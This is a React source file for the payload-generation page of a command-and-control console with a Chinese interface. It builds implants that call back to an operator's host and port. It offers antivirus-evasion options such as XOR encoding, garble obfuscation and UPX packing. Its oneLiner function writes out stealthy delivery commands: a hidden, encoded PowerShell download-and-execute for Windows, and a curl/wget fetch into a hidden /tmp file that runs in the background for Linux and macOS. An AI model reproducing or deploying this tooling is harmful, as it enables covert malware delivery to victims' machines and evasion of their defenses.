import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { Alert, Button, Form, Input, InputNumber, Popconfirm, Select, Switch, Table, Tag, App } from 'antd'
import { CopyOutlined, ReloadOutlined } from '@ant-design/icons'
import { useNavigate } from 'react-router-dom'
import { api, downloadGet } from '../api'
import Page from '../layout/Page'
import styles from './console.module.css'

type TargetInfo = { id: string; label: string; ready: boolean; compiler: string }
type Technique = { id: string; name: string; desc: string; always?: boolean; ready: boolean; lang?: string; os?: string }
type LangInfo = { id: string; label: string; ready: boolean; hint: string }
type Meta = {
  ready: boolean
  compiler: string
  protocol: string
  formats?: string[]
  systems?: string[]
  arch_list?: string[]
  protocols?: string[]
  upx?: boolean
  garble?: boolean
  languages?: LangInfo[]
  techniques?: Technique[]
  toolchain?: { name: string; detail: string; bundled: boolean; ready: boolean }[]
  targets?: TargetInfo[]
}
type Listener = { id: string; name: string; bind: string; port: number }
type RecordItem = {
  id: string
  name?: string
  host: string
  port: number
  filename: string
  target?: string
  os?: string
  arch?: string
  format?: string
  language?: string
  sha256?: string
  token?: string
  techniques?: string[]
  size: number
  at: number
}

function formatSize(n: number) {
  if (n < 1024) return `${n} B`
  return `${(n / 1024).toFixed(1)} KB`
}

function formatAt(n: number) {
  const ms = n < 1e12 ? n * 1000 : n
  return new Date(ms).toLocaleString('zh-CN', { hour12: false })
}

function targetOf(os: string, arch: string) {
  if (os === 'windows') return 'windows-x64'
  return `${os}-${arch}`
}

function filenameOf(os: string, name: string) {
  const base = (name || 'implant').replace(/\.(exe|bin|elf)$/i, '')
  return os === 'windows' ? `${base}.exe` : base
}

function randName(n: number) {
  const letters = 'abcdefghijklmnopqrstuvwxyz0123456789'
  let s = ''
  for (let i = 0; i < n; i++) s += letters[Math.floor(Math.random() * letters.length)]
  return s
}

function utf16leB64(s: string) {
  let bin = ''
  for (let i = 0; i < s.length; i++) {
    const c = s.charCodeAt(i)
    bin += String.fromCharCode(c & 0xff, (c >> 8) & 0xff)
  }
  return btoa(bin)
}

function oneLiner(rec: RecordItem) {
  if (!rec.token) return ''
  const url = `${window.location.origin}/p/${rec.token}`
  const osName = (rec.os || rec.target || 'windows').toLowerCase()
  if (osName.startsWith('windows')) {
    const tmp = `${randName(6)}.exe`
    const ps = `$p="$env:TEMP\\${tmp}";$w=New-Object Net.WebClient;$w.DownloadFile('${url}',$p);Start-Process $p -WindowStyle Hidden`
    return `powershell -w hidden -nop -enc ${utf16leB64(ps)}`
  }
  const tmp = `/tmp/.${randName(6)}`
  return `curl -fsSL '${url}' -o ${tmp} 2>/dev/null || wget -qO ${tmp} '${url}'; chmod +x ${tmp}; nohup ${tmp} >/dev/null 2>&1 &`
}

export default function Payload() {
  const { message } = App.useApp()
  const nav = useNavigate()
  const [form] = Form.useForm()
  const resultRef = useRef<HTMLDivElement>(null)
  const [tab, setTab] = useState<'build' | 'list'>('build')
  const [meta, setMeta] = useState<Meta | null>(null)
  const [rows, setRows] = useState<RecordItem[]>([])
  const [pending, setPending] = useState(false)
  const [listeners, setListeners] = useState<Listener[]>([])
  const [result, setResult] = useState<RecordItem | null>(null)
  const [copied, setCopied] = useState('')

  const load = useCallback(async () => {
    try {
      const [m, listeners, history] = await Promise.all([
        api('/api/payloads') as Promise<Meta>,
        api('/api/listeners') as Promise<Listener[]>,
        api('/api/payloads/history') as Promise<RecordItem[]>,
      ])
      setMeta(m)
      const list = Array.isArray(listeners) ? listeners : []
      setListeners(list)
      setRows(Array.isArray(history) ? history : [])
      if (list[0] && !form.getFieldValue('listener')) {
        const l = list[0]
        const host = !l.bind || l.bind === '0.0.0.0' || l.bind === '::' ? window.location.hostname || '127.0.0.1' : l.bind
        const cur = String(form.getFieldValue('host') || '')
        form.setFieldsValue({
          listener: l.id,
          port: l.port,
          host: !cur || cur === '127.0.0.1' ? host : cur,
        })
      }
    } catch (e) {
      message.error(e instanceof Error ? e.message : '加载失败')
    }
  }, [form, message])

  useEffect(() => {
    void load()
  }, [load])

  const os = Form.useWatch('os', form) || 'windows'
  const arch = Form.useWatch('arch', form) || 'amd64'
  const language = Form.useWatch('language', form) || 'c'
  const targetId = targetOf(os, arch)
  const current = (meta?.targets || []).find((t) => t.id === targetId)
  const format = os === 'windows' ? 'exe' : os === 'darwin' ? 'macho' : 'elf'
  const langReady = (meta?.languages || []).find((l) => l.id === language)?.ready !== false

  const techState = (t: Technique): 'fixed' | 'baked' | 'missing' | 'os' | 'ready' => {
    if (t.always) return 'fixed'
    if (!t.ready) return 'missing'
    if (t.os && t.os !== os) return 'os'
    if (language === 'c' && (t.id === 'gui' || t.id === 'strip')) return 'baked'
    return 'ready'
  }

  const copyText = (text: string, key: string) => {
    void navigator.clipboard.writeText(text).then(
      () => {
        setCopied(key)
        message.success('已复制')
        window.setTimeout(() => setCopied(''), 1500)
      },
      () => message.error('复制失败'),
    )
  }

  const cmd = useMemo(() => (result ? oneLiner(result) : ''), [result])

  const techCopy = (t: Technique, state: ReturnType<typeof techState>) => {
    if (state === 'baked') return 'C 模板已包含，切换到 Go 后可单独开关'
    if (state === 'missing') {
      if (t.id === 'garble') return '未检测到 garble，make tools 后可用'
      if (t.id === 'upx') return '未检测到 upx，安装后可勾选'
    }
    if (language === 'c' && t.id === 'garble') return '打开后会改用 Go 植入端再编译'
    return t.desc
  }

  return (
    <Page
      title="载荷生成"
      extra={
        <Button icon={<ReloadOutlined />} onClick={() => void load()}>
          刷新
        </Button>
      }
    >
      <div className={styles.segBar}>
        <button type="button" className={styles.segBtn} aria-current={tab === 'build' ? 'true' : undefined} onClick={() => setTab('build')}>
          生成载荷
        </button>
        <button
          type="button"
          className={styles.segBtn}
          aria-current={tab === 'list' ? 'true' : undefined}
          onClick={() => setTab('list')}
        >
          载荷列表{rows.length ? ` ${rows.length}` : ''}
        </button>
      </div>
      {tab === 'build' ? (
        <div className={styles.buildStage}>
          {meta && !meta.ready ? (
            <Alert type="warning" showIcon message="没有可用载荷模板或编译器。Windows C 植入端使用内置模板；Go 植入端需要本机 Go。" />
          ) : null}
          <div className={styles.chainBar}>
            {(meta?.toolchain || []).map((t) => (
              <span key={t.name} className={styles.chainChip} title={t.detail}>
                {t.ready ? <Tag color={t.bundled ? 'green' : 'blue'}>{t.bundled ? '内置' : '系统'}</Tag> : <Tag>未安装</Tag>}
                {t.name}
              </span>
            ))}
          </div>
          <Form
            form={form}
            layout="vertical"
            className={styles.buildForm}
            requiredMark={false}
            initialValues={{
              os: 'windows',
              arch: 'amd64',
              language: 'c',
              filename: 'implant.exe',
              port: 34567,
              host: localStorage.getItem('c2.payload.host') || '127.0.0.1',
              xor: true,
              gui: true,
              strip: true,
              garble: false,
              upx: false,
            }}
            onFinish={async () => {
              const v = form.getFieldsValue(true) as {
                os: string
                arch: string
                language: string
                host: string
                port: number
                filename: string
                xor?: boolean
                gui?: boolean
                strip?: boolean
                garble?: boolean
                upx?: boolean
              }
              setPending(true)
              try {
                const target = targetOf(v.os, v.arch)
                const filename = filenameOf(v.os, v.filename)
                const techniques = (['xor', 'gui', 'strip', 'garble', 'upx'] as const).filter((id) => !!v[id])
                const rec = (await api('/api/payloads', {
                  method: 'POST',
                  body: JSON.stringify({ host: v.host, port: v.port, filename, target, language: v.language, techniques }),
                })) as RecordItem
                localStorage.setItem('c2.payload.host', v.host.trim())
                setResult(rec)
                message.success('已生成')
                await load()
                requestAnimationFrame(() => resultRef.current?.scrollIntoView({ behavior: 'smooth', block: 'nearest' }))
              } catch (e) {
                message.error(e instanceof Error ? e.message : '生成失败')
              } finally {
                setPending(false)
              }
            }}
          >
            <div className={`${styles.card} ${styles.cardPad} ${styles.buildCol}`}>
              <h3 className={styles.cardTitle}>生成参数</h3>
              <div className={styles.formRow}>
                <Form.Item name="os" label="操作系统" rules={[{ required: true }]} style={{ flex: 1 }}>
                  <Select
                    options={[
                      { value: 'windows', label: 'Windows' },
                      { value: 'linux', label: 'Linux' },
                      { value: 'darwin', label: 'macOS' },
                    ]}
                    onChange={(v) => {
                      const nextArch = v === 'windows' ? 'amd64' : form.getFieldValue('arch') || 'amd64'
                      const nextLang = v === 'windows' ? form.getFieldValue('language') || 'c' : 'go'
                      form.setFieldsValue({
                        arch: nextArch,
                        language: nextLang,
                        filename: filenameOf(v, form.getFieldValue('filename') || 'implant'),
                        gui: v === 'windows',
                      })
                    }}
                  />
                </Form.Item>
                <Form.Item name="arch" label="架构" rules={[{ required: true }]} style={{ flex: 1 }}>
                  <Select
                    options={[
                      { value: 'amd64', label: 'amd64' },
                      { value: 'arm64', label: 'arm64', disabled: os === 'windows' },
                    ]}
                  />
                </Form.Item>
                <Form.Item label="格式" style={{ flex: 1 }}>
                  <div className={styles.readonly}>{format}</div>
                </Form.Item>
                <Form.Item name="language" label="植入端" rules={[{ required: true }]} style={{ flex: 1.2 }}>
                  <Select
                    options={[
                      { value: 'c', label: 'C · 约 30KB', disabled: os !== 'windows' },
                      { value: 'go', label: 'Go · 跨平台' },
                    ]}
                    onChange={(lang) => {
                      if (lang === 'c') form.setFieldsValue({ gui: true, strip: true, garble: false })
                    }}
                  />
                </Form.Item>
              </div>
              <Form.Item name="listener" label="监听器">
                <Select
                  allowClear
                  placeholder={listeners.length ? '选择已有监听，自动填充回连' : '还没有监听器'}
                  options={listeners.map((l) => ({
                    value: l.id,
                    label: `${l.name}  ${l.bind}:${l.port}`,
                  }))}
                  onChange={(id) => {
                    const l = listeners.find((x) => x.id === id)
                    if (!l) return
                    const host = !l.bind || l.bind === '0.0.0.0' || l.bind === '::' ? window.location.hostname || '127.0.0.1' : l.bind
                    form.setFieldsValue({ host, port: l.port })
                  }}
                />
              </Form.Item>
              {listeners.length === 0 ? (
                <p className={styles.hint} style={{ marginTop: -8, marginBottom: 12 }}>
                  还没有监听器，
                  <Button type="link" size="small" style={{ padding: 0 }} onClick={() => nav('/listeners')}>
                    先去创建一个
                  </Button>
                  ，否则载荷无法回连。
                </p>
              ) : null}
              <div className={styles.formRow}>
                <Form.Item name="host" label="回连地址" rules={[{ required: true, message: '请输入 IPv4 或域名' }]} style={{ flex: 1.6 }}>
                  <Input placeholder="10.0.0.1 或 c2.example.com" autoComplete="off" />
                </Form.Item>
                <Form.Item name="port" label="端口" rules={[{ required: true, message: '请输入端口' }]} style={{ width: 120 }}>
                  <InputNumber min={1} max={65535} style={{ width: '100%' }} />
                </Form.Item>
                <Form.Item name="filename" label="载荷名称" style={{ flex: 1 }}>
                  <Input placeholder={os === 'windows' ? 'implant.exe' : 'implant'} />
                </Form.Item>
              </div>
              <div className={styles.buildActions}>
                <Button type="primary" htmlType="submit" loading={pending} disabled={!langReady || (current ? !current.ready : meta?.ready === false)}>
                  生成载荷
                </Button>
                <p className={styles.hint}>
                  {language === 'c' ? 'C 植入端仅 Windows，打预编译模板，不依赖编译器。' : 'Go 植入端现场编译，右侧免杀选项会写入本次构建。'}
                </p>
              </div>
            </div>
            <div className={`${styles.card} ${styles.cardPad} ${styles.buildCol}`}>
              <h3 className={styles.cardTitle}>免杀选项</h3>
              <div className={styles.techList}>
                {(meta?.techniques || []).map((t) => {
                  const state = techState(t)
                  const tag =
                    state === 'fixed' ? (
                      <Tag>固定</Tag>
                    ) : state === 'baked' ? (
                      <Tag color="blue">已内置</Tag>
                    ) : state === 'missing' ? (
                      <Tag>未安装</Tag>
                    ) : state === 'os' ? (
                      <Tag>仅 Windows</Tag>
                    ) : language === 'c' && t.id === 'garble' ? (
                      <Tag color="gold">切到 Go</Tag>
                    ) : (
                      <Tag color="green">可选</Tag>
                    )
                  const locked = state === 'fixed' || state === 'baked' || state === 'missing' || state === 'os'
                  const desc = techCopy(t, state)
                  return (
                    <div key={t.id} className={styles.techItem} title={desc}>
                      <div className={styles.techHead}>
                        {locked ? (
                          <Switch checked={state === 'fixed' || state === 'baked'} disabled size="small" />
                        ) : (
                          <Form.Item name={t.id} valuePropName="checked" style={{ margin: 0 }}>
                            <Switch
                              size="small"
                              onChange={(on) => {
                                if (on && language === 'c' && t.id === 'garble') {
                                  form.setFieldsValue({ language: 'go', garble: true })
                                }
                              }}
                            />
                          </Form.Item>
                        )}
                        <strong>{t.name}</strong>
                        {tag}
                      </div>
                      <p>{desc}</p>
                    </div>
                  )
                })}
              </div>
            </div>
          </Form>
          {result ? (
            <div ref={resultRef} className={`${styles.card} ${styles.cardPad} ${styles.resultCard}`} style={{ marginBottom: 0 }}>
              <h3 className={styles.cardTitle}>构建结果</h3>
              <div className={styles.resultMeta}>
                <div>
                  <span>名称</span>
                  <strong>{result.name || result.filename}</strong>
                </div>
                <div>
                  <span>格式</span>
                  <strong>{result.format || format}</strong>
                </div>
                <div>
                  <span>系统</span>
                  <strong>
                    {result.os || os}/{result.arch || arch}
                  </strong>
                </div>
                <div>
                  <span>大小</span>
                  <strong>{formatSize(result.size)}</strong>
                </div>
                <div>
                  <span>回连</span>
                  <strong className={styles.mono}>
                    {result.host}:{result.port}
                  </strong>
                </div>
              </div>
              {result.techniques?.length ? (
                <div className={styles.techTags}>
                  {result.techniques.map((x) => (
                    <Tag key={x}>{x}</Tag>
                  ))}
                </div>
              ) : null}
              {cmd ? (
                <div className={styles.oneLiner}>
                  <div className={styles.oneLinerHead}>
                    <span>一条命令上线</span>
                    <Button type="link" size="small" icon={<CopyOutlined />} onClick={() => copyText(cmd, 'cmd')}>
                      {copied === 'cmd' ? '已复制' : '复制'}
                    </Button>
                  </div>
                  <code>{cmd}</code>
                </div>
              ) : null}
              <div className={styles.resultActs}>
                <Button
                  type="primary"
                  onClick={() => {
                    void downloadGet(`/api/payloads/${result.id}/file`, result.filename).then(
                      () => message.success('已开始下载'),
                      (e) => message.error(e instanceof Error ? e.message : '下载失败'),
                    )
                  }}
                >
                  下载载荷
                </Button>
                <Button onClick={() => setResult(null)}>关闭</Button>
              </div>
            </div>
          ) : null}
        </div>
      ) : (
        <div className={`${styles.card} ${styles.tableCard} ${styles.grow}`}>
          <Table
            rowKey="id"
            size="middle"
            pagination={false}
            dataSource={rows}
            locale={{ emptyText: '还没有生成记录，回到「生成载荷」做一份' }}
            columns={[
              { title: '名称', dataIndex: 'filename', render: (v: string, r: RecordItem) => r.name || v },
              {
                title: '格式',
                width: 80,
                render: (_: unknown, r: RecordItem) => <Tag>{r.format || 'exe'}</Tag>,
              },
              {
                title: '系统',
                width: 140,
                render: (_: unknown, r: RecordItem) => `${r.os || r.target || 'windows'}/${r.arch || 'amd64'}`,
              },
              {
                title: '语言',
                width: 70,
                render: (_: unknown, r: RecordItem) => <Tag>{r.language || (String(r.target || '').startsWith('windows') ? 'c' : 'go')}</Tag>,
              },
              {
                title: '回连',
                render: (_: unknown, r: RecordItem) => (
                  <span className={styles.mono}>
                    {r.host}:{r.port}
                  </span>
                ),
              },
              { title: '大小', dataIndex: 'size', width: 90, render: (n: number) => formatSize(n) },
              { title: '时间', dataIndex: 'at', width: 170, render: (n: number) => formatAt(n) },
              {
                title: '操作',
                width: 220,
                render: (_: unknown, r: RecordItem) => (
                  <>
                    <Button
                      type="link"
                      size="small"
                      onClick={() => {
                        void downloadGet(`/api/payloads/${r.id}/file`, r.filename).then(
                          () => message.success('已开始下载'),
                          (e) => message.error(e instanceof Error ? e.message : '下载失败'),
                        )
                      }}
                    >
                      下载
                    </Button>
                    {r.token ? (
                      <Button
                        type="link"
                        size="small"
                        onClick={() => {
                          const cmd = oneLiner(r)
                          if (cmd) copyText(cmd, r.id)
                        }}
                      >
                        一条命令
                      </Button>
                    ) : null}
                    <Popconfirm
                      title="删除这条记录？"
                      onConfirm={() => {
                        void api(`/api/payloads/${r.id}`, { method: 'DELETE' })
                          .then(() => {
                            message.success('已删除')
                            void load()
                          })
                          .catch((e) => message.error(e instanceof Error ? e.message : '删除失败'))
                      }}
                    >
                      <Button type="link" size="small" danger>
                        删除
                      </Button>
                    </Popconfirm>
                  </>
                ),
              },
            ]}
          />
        </div>
      )}
    </Page>
  )
}
